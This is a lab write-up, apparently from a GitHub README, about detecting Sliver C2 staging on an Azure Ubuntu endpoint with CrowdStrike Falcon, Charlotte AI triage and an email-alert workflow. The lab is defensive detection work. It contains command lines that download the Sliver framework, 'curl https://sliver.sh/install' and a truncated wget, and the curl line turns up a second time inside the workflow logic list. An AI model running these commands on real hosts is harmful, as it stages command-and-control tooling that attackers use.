# Charlotte-AI-Threat-Detection
=========================================================

1\. Environment and Asset Context
---------------------------------

The lab is conducted on a monitored endpoint named **“otlab”**, running **Ubuntu 24.04** within a Microsoft Azure virtual machine. The system is onboarded into **CrowdStrike Falcon**, allowing full endpoint visibility, telemetry collection, and detection capabilities.

The asset is identified with:

*   Internal IP address: 10.1.0.152
    
*   External IP address: 52.225.217.2
    
*   Status: Managed and actively reporting
    

This endpoint serves as the target system for simulating adversary behaviour and validating detection and response workflows.

<img width="1919" height="1072" alt="charlotte0" src="https://github.com/user-attachments/assets/8be09314-0cd9-49fc-a342-f6d8f128f067" />


2\. Execution of Suspicious Command-Line Activity
-------------------------------------------------

The test scenario begins with the execution of command-line instructions designed to simulate adversary behaviour:

`   curl https://sliver.sh/install   `

Additional activity includes:

`   wget https://github.com/BishopFox/sliver/releases/...   `

These commands initiate outbound connections to download components of the **Sliver framework**, an open-source adversary emulation and red teaming tool.

Although Sliver is a legitimate tool used by security professionals, its presence on a production-like system is highly indicative of malicious activity, particularly in post-compromise scenarios where attackers stage tooling.

This behaviour aligns with the MITRE ATT&CK technique:

*   **T1105 – Ingress Tool Transfer**

<img width="1919" height="1072" alt="charlotte2" src="https://github.com/user-attachments/assets/def3b79c-82e6-4dd3-9e44-870d66c74d45" />

    

3\. Detection by Endpoint Protection Platform
---------------------------------------------

Following execution, **CrowdStrike Falcon Insight** generates multiple detections associated with the activity. The detections exhibit the following characteristics:

*   Severity: High
    
*   Detection type: Command and Control activity
    
*   Triggering processes: curl, wget
    
*   User context: swordead2026
    
*   Host: otlab
    
*   Status: New and unassigned
    

The detections indicate repeated attempts to retrieve external payloads using command-line utilities. Process lineage further associates the activity with bash and sshd, suggesting remote or interactive execution.

This stage demonstrates the platform’s ability to:

*   Monitor command-line execution in real time
    
*   Identify suspicious outbound activity
    
*   Correlate events across multiple processes

<img width="1919" height="1072" alt="charlotte1" src="https://github.com/user-attachments/assets/945b0a3d-cae7-4f2f-8490-edbe16513ffe" />

4\. Automated Analysis Using Charlotte AI
-----------------------------------------

Upon detection, **Charlotte AI** performs automated analysis of the command-line activity and associated telemetry.

The system provides:

*   A breakdown of the executed command, identifying curl as a data transfer utility
    
*   Contextual analysis of the destination URL, recognising it as a Sliver installation endpoint
    
*   Classification of the activity under Command and Control tactics
    
*   Mapping to Ingress Tool Transfer techniques
    
*   Correlation of multiple detections occurring within the same timeframe on the same host
    

Additionally, Charlotte AI assigns:

*   Confidence level: 80
    
*   Severity rating: High (70)
    

The platform also generates a structured summary describing the sequence of events, including:

*   Timeline of detections
    
*   Associated processes and user activity
    
*   Indicators of compromise
    
*   Risk assessment
    

This functionality effectively replicates Tier 1 and Tier 2 SOC analysis by transforming raw telemetry into actionable intelligence.

<img width="1919" height="905" alt="charlotte3" src="https://github.com/user-attachments/assets/074a028a-68db-4a63-b9de-032e38a4ec03" />



5\. Workflow Automation and Response
------------------------------------

A **Fusion Workflow** is configured to operationalise the detection.

The workflow logic is defined as follows:

*   **Trigger:** Activation upon any Endpoint Protection Platform detection
    
*   curl https://sliver.sh/install
    
*   **Action:** Execution of an email notification containing incident details
    

When the condition is satisfied, the workflow automatically initiates the response action, ensuring timely notification of relevant stakeholders.

It is noted that email delivery is restricted to approved organisational domains, requiring configuration adjustments for production use.

<img width="1919" height="1079" alt="charlotte4" src="https://github.com/user-attachments/assets/aad80c44-71b1-4334-bb5c-49d411a79cdf" />


    
6\. Key Outcomes
----------------

This lab demonstrates several critical security capabilities:

*   Effective detection of suspicious command-line activity associated with tool staging
    
*   Identification of dual-use tools commonly leveraged in adversary operations
    
*   Automated enrichment and contextualisation of security events through AI-driven analysis
    
*   Implementation of conditional workflows to transition from detection to response
    
*   Reduction in manual triage effort through intelligent summarisation and correlation
    

8\. Conclusion
--------------

The lab successfully replicates a modern Security Operations Centre workflow, integrating endpoint detection, AI-assisted analysis, and automated response mechanisms. It highlights how behavioural detection combined with automation can significantly improve response times and reduce analyst workload, while maintaining high fidelity in threat identification.
